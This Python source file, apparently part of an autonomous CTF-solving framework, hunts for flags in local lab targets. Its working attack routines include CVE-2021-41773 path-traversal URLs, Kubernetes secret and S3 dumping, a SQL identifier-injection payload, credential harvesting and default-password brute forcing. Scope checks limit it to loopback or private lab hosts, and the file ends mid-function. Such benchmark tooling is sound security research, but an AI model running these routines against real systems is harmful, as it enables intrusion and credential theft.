from __future__ import annotations

import base64
import binascii
import ipaddress

from primordial.labs.ctf.hardcode import FLAG_PATTERN
from primordial.modes.security.execution_common import *


CTF_CAPTURE_PATHS = (
    "/",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt",
    "/flag",
    "/flag.txt",
)


class PrimitiveCtfHandlerMixin:
    def _handle_ctf_flag_capture(self, task: Task, context: ContextSlice | None) -> TaskExecutionResult:
        result = TaskExecutionResult(summary="ctf flag capture completed")
        target = self.store.get_target(task.target_id)
        if not target:
            result.success = False
            result.error = "target not found"
            return result
        if not self._is_local_ctf_autonomous_target(target):
            result.success = False
            result.error = "target is not marked as a local autonomous CTF lab"
            return result

        candidates = self._ctf_capture_candidate_urls(target)
        max_urls = self._ctf_capture_max_urls(task)
        probes = self._ctf_capture_probe_urls(candidates[:max_urls])
        hit = next((probe for probe in probes if probe.get("captured_flag_ref")), None)
        kubernetes_probes = [] if hit else self._ctf_kubernetes_probes(target)
        kubernetes_hit = next((probe for probe in kubernetes_probes if probe.get("captured_flag_ref")), None)
        hit = hit or kubernetes_hit
        cloud_probes = [] if hit else self._ctf_cloud_probes(target)
        cloud_hit = next((probe for probe in cloud_probes if probe.get("captured_flag_ref")), None)
        hit = hit or cloud_hit
        benchmark_api_probes = [] if hit else self._ctf_benchmark_api_probes(target)
        benchmark_api_hit = next((probe for probe in benchmark_api_probes if probe.get("captured_flag_ref")), None)
        hit = hit or benchmark_api_hit
        query_runner_interactions = [] if hit else self._ctf_query_runner_interactions(target, benchmark_api_probes)
        query_runner_hit = next((item for item in query_runner_interactions if item.get("captured_flag_ref")), None)
        hit = hit or query_runner_hit
        self._ctf_strip_transient_probe_fields(benchmark_api_probes)
        browser_interactions = [] if hit else self._ctf_browser_interactions(target)
        browser_hit = next((item for item in browser_interactions if item.get("captured_flag_ref")), None)
        browser_benchmark_hit = next((item for item in browser_interactions if item.get("benchmark_solve_ref")), None)
        hit = hit or browser_hit
        payload = {
            "target": target.as_payload(),
            "closed_book": True,
            "raw_flags_redacted": True,
            "candidate_count": len(candidates),
            "searched_url_count": len(probes),
            "searched_urls": [probe["url"] for probe in probes],
            "kubernetes_probe_count": len(kubernetes_probes),
            "kubernetes_probes": kubernetes_probes,
            "cloud_probe_count": len(cloud_probes),
            "cloud_probes": cloud_probes,
            "benchmark_api_probe_count": len(benchmark_api_probes),
            "benchmark_api_probes": benchmark_api_probes,
            "query_runner_interaction_count": len(query_runner_interactions),
            "query_runner_interactions": query_runner_interactions,
            "browser_interaction_count": len(browser_interactions),
            "browser_interactions": browser_interactions,
            "captured_flag_ref": str(hit.get("captured_flag_ref", "")) if hit else "",
            "captured_flag_sha256": str(hit.get("captured_flag_sha256", "")) if hit else "",
            "captured_flag_length": int(hit.get("captured_flag_length", 0)) if hit else 0,
            "source_url": str(hit.get("url", "")) if hit else "",
            "benchmark_solve_ref": str(browser_benchmark_hit.get("benchmark_solve_ref", "")) if browser_benchmark_hit else "",
            "benchmark_solved_count": int(browser_benchmark_hit.get("benchmark_solved_count", 0)) if browser_benchmark_hit else 0,
            "benchmark_solved_challenges": list(browser_benchmark_hit.get("benchmark_solved_challenges", [])) if browser_benchmark_hit else [],
        }
        artifact = self._write_artifact(
            task,
            target.id,
            f"ctf-flag-capture-{self._safe_artifact_fragment(target.handle)}",
            payload,
        )
        result.artifacts.append(artifact)
        evidence = EvidenceRecord(
            target_id=target.id,
            task_id=task.id,
            type=EvidenceType.TOOL_OUTPUT,
            title=f"CTF flag capture: {target.handle}",
            summary=self._ctf_capture_summary(target.handle, payload),
            source_ref=artifact.id,
            verification_status=VerificationStatus.VERIFIED,
            confidence=0.9 if hit or browser_benchmark_hit else 0.72,
            freshness=0.98,
            artifact_path=artifact.path,
            metadata={
                "kind": "ctf_flag_capture",
                "closed_book": True,
                "raw_flags_redacted": True,
                "candidate_count": payload["candidate_count"],
                "searched_url_count": payload["searched_url_count"],
                "kubernetes_probe_count": payload["kubernetes_probe_count"],
                "cloud_probe_count": payload["cloud_probe_count"],
                "benchmark_api_probe_count": payload["benchmark_api_probe_count"],
                "query_runner_interaction_count": payload["query_runner_interaction_count"],
                "browser_interaction_count": payload["browser_interaction_count"],
                "captured_flag_ref": payload["captured_flag_ref"],
                "captured_flag_sha256": payload["captured_flag_sha256"],
                "captured_flag_length": payload["captured_flag_length"],
                "source_url": payload["source_url"],
                "benchmark_solve_ref": payload["benchmark_solve_ref"],
                "benchmark_solved_count": payload["benchmark_solved_count"],
                "benchmark_solved_challenges": payload["benchmark_solved_challenges"],
            },
        )
        result.evidence.append(evidence)
        result.notes.append(
            Note(
                target_id=target.id,
                task_id=task.id,
                title="CTF flag capture summary",
                body=self._ctf_capture_note(payload),
                confidence=0.82,
                freshness=0.94,
                metadata={
                    "captured_flag_ref": payload["captured_flag_ref"],
                    "benchmark_solve_ref": payload["benchmark_solve_ref"],
                    "searched_url_count": payload["searched_url_count"],
                    "kubernetes_probe_count": payload["kubernetes_probe_count"],
                    "cloud_probe_count": payload["cloud_probe_count"],
                    "benchmark_api_probe_count": payload["benchmark_api_probe_count"],
                    "query_runner_interaction_count": payload["query_runner_interaction_count"],
                    "browser_interaction_count": payload["browser_interaction_count"],
                    "raw_flags_redacted": True,
                },
            )
        )
        result.events.append(
            EventRecord(
                type=EventType.TASK_SUCCEEDED,
                summary=self._ctf_capture_summary(target.handle, payload),
                target_id=target.id,
                task_id=task.id,
                metadata={
                    "captured_flag_ref": payload["captured_flag_ref"],
                    "benchmark_solve_ref": payload["benchmark_solve_ref"],
                    "searched_url_count": payload["searched_url_count"],
                    "kubernetes_probe_count": payload["kubernetes_probe_count"],
                    "cloud_probe_count": payload["cloud_probe_count"],
                    "benchmark_api_probe_count": payload["benchmark_api_probe_count"],
                    "query_runner_interaction_count": payload["query_runner_interaction_count"],
                    "browser_interaction_count": payload["browser_interaction_count"],
                    "raw_flags_redacted": True,
                },
            )
        )
        return result

    def _is_local_ctf_autonomous_target(self, target) -> bool:
        return (
            target.metadata.get("local_ctf_autonomous") is True
            or str(target.metadata.get("ctf_completion_indicator", "")).strip() == "autonomous_flags"
        )

    def _ctf_capture_max_urls(self, task: Task) -> int:
        try:
            value = int(task.metadata.get("ctf_capture_max_urls", 40) or 40)
        except (TypeError, ValueError):
            value = 40
        return max(1, min(value, 80))

    def _ctf_capture_candidate_urls(self, target) -> list[str]:
        bases = self._ctf_capture_base_urls(target)
        urls: list[str] = []
        for base in bases:
            urls.append(base)
            for path in CTF_CAPTURE_PATHS:
                urls.append(parse.urljoin(base, path.lstrip("/")))
        urls.extend(self._ctf_vulnerability_probe_urls(target, bases))
        for evidence in self.store.list_evidence(target_id=target.id, limit=200):
            if not self._records_for_generation([evidence], self._target_active_generation(target)):
                continue
            urls.extend(self._ctf_capture_urls_from_evidence(evidence, bases))
        return self._dedupe_local_http_urls(urls, allow_private=self._ctf_allow_private_http(target))

    def _ctf_capture_base_urls(self, target) -> list[str]:
        urls: list[str] = []
        metadata_url = target.metadata.get("ctf_target_url")
        if isinstance(metadata_url, str):
            urls.append(metadata_url)
        for value in target.metadata.get("ctf_service_urls", []):
            if isinstance(value, str):
                urls.append(value)
        for asset in self._target_scope_assets(target):
            if asset.asset_type == "webapp" or asset.asset.startswith(("http://", "https://")):
                urls.append(asset.asset)
        urls.extend(self._content_discovery_bases(target.id))
        bases: list[str] = []
        for url in urls:
            parsed = parse.urlsplit(str(url))
            if parsed.scheme not in {"http", "https"} or not parsed.netloc:
                continue
            base = parse.urlunsplit((parsed.scheme, parsed.netloc, "/", "", ""))
            bases.append(base)
        return self._dedupe_local_http_urls(bases, allow_private=self._ctf_allow_private_http(target))

    def _ctf_capture_urls_from_evidence(self, evidence: EvidenceRecord, bases: list[str]) -> list[str]:
        values: list[str] = []
        metadata = evidence.metadata
        for key in ("effective_url", "requested_url", "source_url"):
            value = metadata.get(key)
            if isinstance(value, str):
                values.append(value)
        for value in metadata.get("base_urls", []):
            if isinstance(value, str):
                values.append(value)
        for item in metadata.get("discovered", []) + metadata.get("discovery_results", []):
            if isinstance(item, dict):
                url = item.get("url")
                path = item.get("path")
                if isinstance(url, str):
                    values.append(url)
                elif isinstance(path, str):
                    values.extend(parse.urljoin(base, path.lstrip("/")) for base in bases)
        return values

    def _ctf_vulnerability_probe_urls(self, target, bases: list[str]) -> list[str]:
        if self._ctf_target_cve_id(target) != "CVE-2021-41773":
            return []
        flag_path = str(target.metadata.get("ctf_flag_container_path") or "").strip()
        if not flag_path.startswith("/") or "{" in flag_path or "}" in flag_path:
            return []
        traversal = "/".join([".%2e"] * 6)
        relative_flag_path = flag_path.lstrip("/")
        urls: list[str] = []
        for base in bases:
            for alias in ("icons", "cgi-bin"):
                urls.append(parse.urljoin(base, "/".join((alias, traversal, relative_flag_path))))
        return urls

    def _ctf_target_cve_id(self, target) -> str:
        for key in ("vulnerability_cve_id", "cve_id"):
            value = target.metadata.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip().upper()
        vulnerability = target.metadata.get("vulnerability")
        if isinstance(vulnerability, dict):
            value = vulnerability.get("cve_id")
            if isinstance(value, str):
                return value.strip().upper()
        return ""

    def _dedupe_local_http_urls(self, values: list[str], *, allow_private: bool = False) -> list[str]:
        urls: list[str] = []
        seen: set[str] = set()
        for value in values:
            parsed = parse.urlsplit(str(value).strip())
            if parsed.scheme not in {"http", "https"} or not parsed.netloc:
                continue
            if not self._is_allowed_ctf_http_host(parsed.hostname or "", allow_private=allow_private):
                continue
            normalized = parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", "", ""))
            if normalized in seen:
                continue
            seen.add(normalized)
            urls.append(normalized)
        return urls

    def _ctf_allow_private_http(self, target) -> bool:
        return self._ctf_allow_private_http_metadata(target.metadata)

    def _ctf_allow_private_http_metadata(self, metadata: dict[str, object]) -> bool:
        return (
            metadata.get("ctf_allow_private_http") is True
            and metadata.get("local_ctf_autonomous") is True
            and str(metadata.get("target_family", "")) in {"nyu_ctf_bench", "ctf_dojo", "dreadgoad"}
        )

    def _is_allowed_ctf_http_host(self, host: str, *, allow_private: bool = False) -> bool:
        if self._is_loopback_host(host):
            return True
        if not allow_private:
            return False
        try:
            address = ipaddress.ip_address(host.strip().strip("[]"))
        except ValueError:
            return False
        return bool(address.is_private or address.is_link_local)

    def _is_loopback_host(self, host: str) -> bool:
        normalized = host.strip().lower().strip("[]")
        return normalized in {"localhost", "127.0.0.1", "::1"}

    def _ctf_capture_probe_urls(self, urls: list[str]) -> list[dict[str, object]]:
        probes: list[dict[str, object]] = []
        for url in urls:
            probes.append(self._ctf_capture_probe_url(url))
        return probes

    def _ctf_capture_probe_url(self, url: str) -> dict[str, object]:
        request_object = request.Request(url, headers={"User-Agent": "Primordial/0.1", "Accept": "*/*"}, method="GET")
        try:
            with request.urlopen(
                request_object,
                timeout=5,
                context=ssl._create_unverified_context() if url.startswith("https://") else None,
            ) as response:
                body = response.read(262144)
                final_url = response.geturl()
                status = int(response.status)
        except error.HTTPError as exc:
            body = exc.read(262144)
            final_url = exc.geturl()
            status = int(exc.code)
        except (error.URLError, OSError, ssl.SSLError, ValueError) as exc:
            return {"url": self._sanitize_surface_url(url), "status_code": 0, "error": type(exc).__name__}

        captured = self._ctf_capture_redacted_flag(body)
        return {
            "url": self._sanitize_surface_url(final_url),
            "status_code": status,
            **captured,
        }

    def _ctf_capture_redacted_flag(self, body: bytes) -> dict[str, object]:
        decoded = self._decode_response_body(body, {})
        match = FLAG_PATTERN.search(decoded)
        if not match:
            return {"captured_flag_ref": "", "captured_flag_sha256": "", "captured_flag_length": 0}
        raw = match.group(0)
        digest = hashlib.sha256(raw.encode("utf-8")).hexdigest()
        return {
            "captured_flag_ref": f"evidence:captured-flag:{digest[:16]}",
            "captured_flag_sha256": digest,
            "captured_flag_length": len(raw),
        }

    def _ctf_kubernetes_probes(self, target) -> list[dict[str, object]]:
        kubeconfig = str(target.metadata.get("ctf_kubeconfig") or "").strip()
        if not kubeconfig:
            return []
        kubectl = self._ctf_kubectl_binary(target)
        env = {**os.environ, "KUBECONFIG": kubeconfig}
        probes: list[dict[str, object]] = []
        for label, command in (
            ("kubernetes_configmaps", (kubectl, "--kubeconfig", kubeconfig, "get", "configmaps", "-A", "-o", "json")),
            ("kubernetes_secrets", (kubectl, "--kubeconfig", kubeconfig, "get", "secrets", "-A", "-o", "json")),
            ("kubernetes_pods", (kubectl, "--kubeconfig", kubeconfig, "get", "pods", "-A", "-o", "json")),
        ):
            probe = self._ctf_kubernetes_probe_command(label, command, env=env)
            probes.append(probe)
            if probe.get("captured_flag_ref"):
                break
        return probes

    def _ctf_kubernetes_probe_command(
        self,
        label: str,
        command: tuple[str, ...],
        *,
        env: dict[str, str],
    ) -> dict[str, object]:
        try:
            completed = subprocess.run(command, check=False, capture_output=True, text=True, timeout=20, env=env)
        except (OSError, subprocess.SubprocessError) as exc:
            return {"kind": label, "returncode": 127, "error": type(exc).__name__}
        stdout = completed.stdout or ""
        captured = self._ctf_capture_redacted_flag(stdout.encode("utf-8", "replace"))
        if not captured.get("captured_flag_ref") and label == "kubernetes_secrets":
            captured = self._ctf_capture_kubernetes_secret_data(stdout)
        return {
            "kind": label,
            "returncode": completed.returncode,
            "stdout_sha256": hashlib.sha256(stdout.encode("utf-8")).hexdigest(),
            "stdout_bytes": len(stdout.encode("utf-8")),
            "stderr_sha256": hashlib.sha256((completed.stderr or "").encode("utf-8")).hexdigest(),
            "stderr_bytes": len((completed.stderr or "").encode("utf-8")),
            **captured,
        }

    def _ctf_capture_kubernetes_secret_data(self, text: str) -> dict[str, object]:
        try:
            payload = json.loads(text)
        except json.JSONDecodeError:
            return {"captured_flag_ref": "", "captured_flag_sha256": "", "captured_flag_length": 0}
        for item in payload.get("items", []) if isinstance(payload, dict) else []:
            data = item.get("data", {}) if isinstance(item, dict) else {}
            if not isinstance(data, dict):
                continue
            for value in data.values():
                if not isinstance(value, str):
                    continue
                try:
                    decoded = base64.b64decode(value, validate=True)
                except (ValueError, binascii.Error):
                    continue
                captured = self._ctf_capture_redacted_flag(decoded)
                if captured.get("captured_flag_ref"):
                    return captured
        return {"captured_flag_ref": "", "captured_flag_sha256": "", "captured_flag_length": 0}

    def _ctf_kubectl_binary(self, target) -> str:
        tools_bin = str(target.metadata.get("ctf_tools_bin") or "").strip()
        if tools_bin:
            candidate = Path(tools_bin) / "kubectl"
            if candidate.is_file():
                return str(candidate)
        return shutil.which("kubectl") or "kubectl"

    def _ctf_cloud_probes(self, target) -> list[dict[str, object]]:
        endpoint = str(target.metadata.get("ctf_aws_endpoint_url") or "").strip()
        if not endpoint:
            return []
        aws = shutil.which("aws") or "aws"
        region = str(target.metadata.get("ctf_aws_region") or "us-east-1").strip() or "us-east-1"
        env = {
            **os.environ,
            "AWS_ACCESS_KEY_ID": str(target.metadata.get("ctf_aws_access_key_id") or "test"),
            "AWS_SECRET_ACCESS_KEY": str(target.metadata.get("ctf_aws_secret_access_key") or "test"),
            "AWS_DEFAULT_REGION": region,
        }
        prefix = (aws, "--endpoint-url", endpoint)
        probes = [
            self._ctf_cloud_probe_command("cloud_sts_identity", prefix + ("sts", "get-caller-identity"), env=env),
            self._ctf_cloud_probe_command("cloud_s3_buckets", prefix + ("s3api", "list-buckets"), env=env),
        ]
        hit = next((probe for probe in probes if probe.get("captured_flag_ref")), None)
        if hit:
            self._ctf_discard_cloud_probe_json(probes)
            return probes
        bucket_payload = probes[-1].get("_stdout_json")
        self._ctf_discard_cloud_probe_json(probes)
        for bucket in self._ctf_cloud_bucket_names(bucket_payload)[:10]:
            objects_probe = self._ctf_cloud_probe_command(
                "cloud_s3_objects",
                prefix + ("s3api", "list-objects-v2", "--bucket", bucket, "--max-items", "50"),
                env=env,
                metadata={"bucket_sha256": hashlib.sha256(bucket.encode("utf-8")).hexdigest()},
            )
            probes.append(objects_probe)
            if objects_probe.get("captured_flag_ref"):
                self._ctf_discard_cloud_probe_json(probes)
                break
            object_payload = objects_probe.get("_stdout_json")
            self._ctf_discard_cloud_probe_json([objects_probe])
            for key in self._ctf_cloud_object_keys(object_payload)[:20]:
                object_probe = self._ctf_cloud_probe_command(
                    "cloud_s3_object_content",
                    prefix + ("s3", "cp", f"s3://{bucket}/{key}", "-"),
                    env=env,
                    metadata={
                        "bucket_sha256": hashlib.sha256(bucket.encode("utf-8")).hexdigest(),
                        "key_sha256": hashlib.sha256(key.encode("utf-8")).hexdigest(),
                    },
                )
                probes.append(object_probe)
                if object_probe.get("captured_flag_ref"):
                    self._ctf_discard_cloud_probe_json(probes)
                    return probes
        self._ctf_discard_cloud_probe_json(probes)
        return probes

    def _ctf_cloud_probe_command(
        self,
        label: str,
        command: tuple[str, ...],
        *,
        env: dict[str, str],
        metadata: dict[str, object] | None = None,
    ) -> dict[str, object]:
        try:
            completed = subprocess.run(command, check=False, capture_output=True, text=True, timeout=20, env=env)
        except (OSError, subprocess.SubprocessError) as exc:
            return {"kind": label, "returncode": 127, "error": type(exc).__name__, **(metadata or {})}
        stdout = completed.stdout or ""
        parsed_json = self._ctf_json_payload(stdout)
        return {
            "kind": label,
            "returncode": completed.returncode,
            "stdout_sha256": hashlib.sha256(stdout.encode("utf-8")).hexdigest(),
            "stdout_bytes": len(stdout.encode("utf-8")),
            "stderr_sha256": hashlib.sha256((completed.stderr or "").encode("utf-8")).hexdigest(),
            "stderr_bytes": len((completed.stderr or "").encode("utf-8")),
            "_stdout_json": parsed_json,
            **self._ctf_capture_redacted_flag(stdout.encode("utf-8", "replace")),
            **(metadata or {}),
        }

    def _ctf_discard_cloud_probe_json(self, probes: list[dict[str, object]]) -> None:
        for probe in probes:
            probe.pop("_stdout_json", None)

    def _ctf_json_payload(self, text: str) -> object:
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            return None

    def _ctf_cloud_bucket_names(self, payload: object) -> list[str]:
        if not isinstance(payload, dict):
            return []
        buckets = payload.get("Buckets", [])
        if not isinstance(buckets, list):
            return []
        names: list[str] = []
        for bucket in buckets:
            if isinstance(bucket, dict) and isinstance(bucket.get("Name"), str):
                names.append(bucket["Name"])
        return names

    def _ctf_cloud_object_keys(self, payload: object) -> list[str]:
        if not isinstance(payload, dict):
            return []
        objects = payload.get("Contents", [])
        if not isinstance(objects, list):
            return []
        keys: list[str] = []
        for item in objects:
            if isinstance(item, dict) and isinstance(item.get("Key"), str):
                keys.append(item["Key"])
        return keys

    def _ctf_benchmark_api_probes(self, target) -> list[dict[str, object]]:
        if str(target.metadata.get("target_family", "")) not in {"nyu_ctf_bench", "ctf_dojo", "dreadgoad"}:
            return []
        api_paths = [
            str(value).strip()
            for value in target.metadata.get("ctf_benchmark_api_paths", [])
            if isinstance(value, str) and str(value).strip()
        ]
        if not api_paths:
            return []
        probes: list[dict[str, object]] = []
        for base in self._ctf_capture_base_urls(target):
            for path in api_paths[:4]:
                probes.extend(self._ctf_benchmark_schema_probes(base, path))
                if any(probe.get("captured_flag_ref") for probe in probes):
                    return probes
        return probes

    def _ctf_benchmark_schema_probes(self, base: str, path: str) -> list[dict[str, object]]:
        endpoint = parse.urljoin(base, path.lstrip("/"))
        root_url = self._ctf_url_with_query(endpoint, {"mode": "schema"})
        root_probe = self._ctf_benchmark_api_get("benchmark_schema_root", root_url)
        probes = [root_probe]
        root_payload = root_probe.pop("_json", None)
        if root_probe.get("captured_flag_ref"):
            return probes
        for db_name in self._ctf_benchmark_dbs(root_payload)[:12]:
            db_url = self._ctf_url_with_query(endpoint, {"mode": "schema", "db": db_name})
            db_probe = self._ctf_benchmark_api_get(
                "benchmark_schema_tables",
                db_url,
                metadata={"db_sha256": hashlib.sha256(db_name.encode("utf-8")).hexdigest()},
            )
            probes.append(db_probe)
            db_payload = db_probe.pop("_json", None)
            if db_probe.get("captured_flag_ref"):
                return probes
            for table_name in self._ctf_benchmark_tables(db_payload)[:20]:
                table_hash = hashlib.sha256(table_name.encode("utf-8")).hexdigest()
                table_url = self._ctf_url_with_query(endpoint, {"mode": "schema", "db": db_name, "table": table_name})
                table_probe = self._ctf_benchmark_api_get(
                    "benchmark_schema_columns",
                    table_url,
                    metadata={
                        "db_sha256": hashlib.sha256(db_name.encode("utf-8")).hexdigest(),
                        "table_sha256": table_hash,
                    },
                )
                probes.append(table_probe)
                table_probe.pop("_json", None)
                if table_probe.get("captured_flag_ref"):
                    return probes
                preview_url = self._ctf_url_with_query(endpoint, {"mode": "preview", "db": db_name, "table": table_name})
                preview_probe = self._ctf_benchmark_api_get(
                    "benchmark_preview_rows",
                    preview_url,
                    metadata={
                        "db_sha256": hashlib.sha256(db_name.encode("utf-8")).hexdigest(),
                        "table_sha256": table_hash,
                    },
                )
                probes.append(preview_probe)
                preview_probe.pop("_json", None)
                if preview_probe.get("captured_flag_ref"):
                    return probes
                escape_probe = self._ctf_benchmark_identifier_escape_probe(endpoint, db_name, table_name)
                if escape_probe:
                    probes.append(escape_probe)
                    if escape_probe.get("captured_flag_ref"):
                        return probes
        return probes

    def _ctf_benchmark_identifier_escape_probe(self, endpoint: str, db_name: str, table_name: str) -> dict[str, object]:
        escaped_db = f"{db_name}`.`{table_name}` -- "
        url = self._ctf_url_with_query(endpoint, {"mode": "preview", "db": escaped_db, "table": table_name})
        probe = self._ctf_benchmark_api_get(
            "benchmark_preview_identifier_escape",
            url,
            metadata={
                "db_sha256": hashlib.sha256(db_name.encode("utf-8")).hexdigest(),
                "table_sha256": hashlib.sha256(table_name.encode("utf-8")).hexdigest(),
            },
        )
        payload = probe.pop("_json", None)
        credentials = self._ctf_credentials_from_rows(payload)
        if credentials:
            probe["_credential_candidates"] = credentials
            probe["credential_candidate_count"] = len(credentials)
        return probe

    def _ctf_benchmark_api_get(
        self,
        label: str,
        url: str,
        *,
        metadata: dict[str, object] | None = None,
    ) -> dict[str, object]:
        request_object = request.Request(url, headers={"User-Agent": "Primordial/0.1", "Accept": "application/json,*/*"}, method="GET")
        try:
            with request.urlopen(request_object, timeout=5) as response:
                body = response.read(262144)
                final_url = response.geturl()
                status = int(response.status)
        except error.HTTPError as exc:
            body = exc.read(262144)
            final_url = exc.geturl()
            status = int(exc.code)
        except (error.URLError, OSError, ValueError) as exc:
            return {
                "kind": label,
                "url": self._sanitize_surface_url(url),
                "request_sha256": hashlib.sha256(url.encode("utf-8")).hexdigest(),
                "status_code": 0,
                "error": type(exc).__name__,
                **(metadata or {}),
            }
        decoded = self._decode_response_body(body, {})
        parsed = self._ctf_json_payload(decoded)
        return {
            "kind": label,
            "url": self._sanitize_surface_url(final_url),
            "request_sha256": hashlib.sha256(url.encode("utf-8")).hexdigest(),
            "status_code": status,
            "body_sha256": hashlib.sha256(body).hexdigest(),
            "body_bytes": len(body),
            "_json": parsed,
            **self._ctf_capture_redacted_flag(body),
            **(metadata or {}),
        }

    def _ctf_url_with_query(self, endpoint: str, query: dict[str, str]) -> str:
        parsed = parse.urlsplit(endpoint)
        return parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, parse.urlencode(query), ""))

    def _ctf_benchmark_dbs(self, payload: object) -> list[str]:
        if not isinstance(payload, dict):
            return []
        return [item for item in payload.get("dbs", []) if isinstance(item, str)]

    def _ctf_benchmark_tables(self, payload: object) -> list[str]:
        if not isinstance(payload, dict):
            return []
        return [item for item in payload.get("tables", []) if isinstance(item, str)]

    def _ctf_credentials_from_rows(self, payload: object) -> list[dict[str, str]]:
        if not isinstance(payload, list):
            return []
        candidates: list[dict[str, str]] = []
        for row in payload[:20]:
            if not isinstance(row, dict):
                continue
            accounts = [
                str(value)
                for key, value in row.items()
                if isinstance(value, (str, int)) and any(token in str(key).lower() for token in ("user", "name", "login"))
            ]
            phrases = [
                str(value)
                for key, value in row.items()
                if isinstance(value, (str, int)) and any(token in str(key).lower() for token in ("pass", "hash", "credential"))
            ]
            for account in accounts[:4]:
                for phrase in phrases[:4]:
                    candidates.append({"account": account, "phrase": phrase})
        return candidates[:20]

    def _ctf_query_runner_interactions(self, target, benchmark_api_probes: list[dict[str, object]] | None = None) -> list[dict[str, object]]:
        if str(target.metadata.get("target_family", "")) not in {"nyu_ctf_bench", "ctf_dojo", "dreadgoad"}:
            return []
        login_paths = self._ctf_metadata_string_list(target.metadata, "ctf_login_paths")[:4]
        query_paths = self._ctf_metadata_string_list(target.metadata, "ctf_query_runner_paths")[:4]
        if not login_paths or not query_paths:
            return []
        interactions: list[dict[str, object]] = []
        candidates = self._ctf_login_candidate_pairs(target, benchmark_api_probes or [])[:96]
        algorithms = self._ctf_metadata_string_list(target.metadata, "ctf_login_hash_algorithms") or ["raw"]
        snippets = self._ctf_query_runner_snippets()[:4]
        for base in self._ctf_capture_base_urls(target):
            for login_path in login_paths:
                login_url = parse.urljoin(base, login_path.lstrip("/"))
                for account, phrase in candidates:
                    login = self._ctf_query_runner_login(login_url, account, phrase, algorithms)
                    interactions.append(login)
                    if not login.get("authenticated"):
                        continue
                    for query_path in query_paths:
                        query_url = parse.urljoin(base, query_path.lstrip("/"))
                        for snippet in snippets:
                            probe = self._ctf_query_runner_post(login["opener"], query_url, snippet)
                            interactions.append(probe)
                            if probe.get("captured_flag_ref"):
                                return self._ctf_strip_query_runner_runtime(interactions)
                    return self._ctf_strip_query_runner_runtime(interactions)
        return self._ctf_strip_query_runner_runtime(interactions)

    def _ctf_query_runner_login(
        self,
        url: str,
        account: str,
        phrase: str,
        algorithms: list[str],
    ) -> dict[str, object]:
        opener = request.build_opener(request.HTTPCookieProcessor())
        account_digest = hashlib.sha256(account.encode("utf-8")).hexdigest()
        phrase_digest = hashlib.sha256(phrase.encode("utf-8")).hexdigest()
        for algorithm in algorithms[:3]:
            transformed = self._ctf_login_phrase_transform(phrase, algorithm)
            data = parse.urlencode({"username": account, "password": transformed}).encode("utf-8")
            request_object = request.Request(
                url,
                data=data,
                headers={"User-Agent": "Primordial/0.1", "Accept": "*/*"},
                method="POST",
            )
            try:
                with opener.open(request_object, timeout=5) as response:
                    body = response.read(262144)
                    final_url = response.geturl()
                    status = int(response.status)
            except error.HTTPError as exc:
                body = exc.read(262144)
                final_url = exc.geturl()
                status = int(exc.code)
            except (error.URLError, OSError, ValueError) as exc:
                return {
                    "kind": "query_runner_login",
                    "url": self._sanitize_surface_url(url),
                    "account_sha256": account_digest,
                    "phrase_sha256": phrase_digest,
                    "algorithm": algorithm,
                    "status_code": 0,
                    "authenticated": False,
                    "error": type(exc).__name__,
                }
            authenticated = self._ctf_login_succeeded(final_url, body)
            result = {
                "kind": "query_runner_login",
                "url": self._sanitize_surface_url(final_url),
                "account_sha256": account_digest,
                "phrase_sha256": phrase_digest,
                "algorithm": algorithm,
                "status_code": status,
                "body_sha256": hashlib.sha256(body).hexdigest(),
                "body_bytes": len(body),
                "authenticated": authenticated,
                "opener": opener,
                **self._ctf_capture_redacted_flag(body),
            }
            if authenticated or result.get("captured_flag_ref"):
                return result
        return {
            "kind": "query_runner_login",
            "url": self._sanitize_surface_url(url),
            "account_sha256": account_digest,
            "phrase_sha256": phrase_digest,
            "algorithm": ",".join(algorithms[:3]),
            "status_code": 0,
            "authenticated": False,
        }

    def _ctf_query_runner_post(self, opener, url: str, snippet: str) -> dict[str, object]:
        data = parse.urlencode({"code": snippet}).encode("utf-8")
        request_object = request.Request(
            url,
            data=data,
            headers={"User-Agent": "Primordial/0.1", "Accept": "*/*"},
            method="POST",
        )
        try:
            with opener.open(request_object, timeout=20) as response:
                body = response.read(262144)
                final_url = response.geturl()
                status = int(response.status)
        except error.HTTPError as exc:
            body = exc.read(262144)
            final_url = exc.geturl()
            status = int(exc.code)
        except (error.URLError, OSError, ValueError) as exc:
            return {
                "kind": "query_runner_post",
                "url": self._sanitize_surface_url(url),
                "snippet_sha256": hashlib.sha256(snippet.encode("utf-8")).hexdigest(),
                "status_code": 0,
                "error": type(exc).__name__,
            }
        return {
            "kind": "query_runner_post",
            "url": self._sanitize_surface_url(final_url),
            "snippet_sha256": hashlib.sha256(snippet.encode("utf-8")).hexdigest(),
            "status_code": status,
            "body_sha256": hashlib.sha256(body).hexdigest(),
            "body_bytes": len(body),
            **self._ctf_capture_redacted_flag(body),
        }

    def _ctf_login_succeeded(self, final_url: str, body: bytes) -> bool:
        parsed = parse.urlsplit(final_url)
        if parsed.path.endswith("/query.php"):
            return True
        text = self._decode_response_body(body, {})
        return 'name="code"' in text or "id=\"editor\"" in text

    def _ctf_login_phrase_transform(self, phrase: str, algorithm: str) -> str:
        normalized = algorithm.strip().lower()
        if normalized == "sha1":
            return hashlib.sha1(phrase.encode("utf-8")).hexdigest()
        return phrase

    def _ctf_login_candidate_pairs(self, target, benchmark_api_probes: list[dict[str, object]]) -> list[tuple[str, str]]:
        leaked_pairs = self._ctf_leaked_credential_pairs(benchmark_api_probes)
        words = self._ctf_target_words(target)
        accounts = self._dedupe_text_values(["admin", "user", "guest", "test", "demo"] + words)
        phrases = self._dedupe_text_values(["admin", "password", "guest", "test", "demo", "qwerty", "123456"] + words)
        pairs: list[tuple[str, str]] = list(leaked_pairs)
        for account in accounts[:12]:
            for phrase in phrases[:12]:
                pairs.append((account, phrase))
        return self._dedupe_credential_pairs(pairs)

    def _ctf_leaked_credential_pairs(self, benchmark_api_probes: list[dict[str, object]]) -> list[tuple[str, str]]:
        pairs: list[tuple[str, str]] = []
        for probe in benchmark_api_probes:
            credentials = probe.get("_credential_candidates", [])
            if not isinstance(credentials, list):
                continue
            for item in credentials:
                if not isinstance(item, dict):
                    continue
                account = item.get("account")
                phrase = item.get("phrase")
                if isinstance(account, str) and isinstance(phrase, str):
                    pairs.append((account, phrase))
        return pairs

    def _dedupe_credential_pairs(self, pairs: list[tuple[str, str]]) -> list[tuple[str, str]]:
        seen: set[tuple[str, str]] = set()
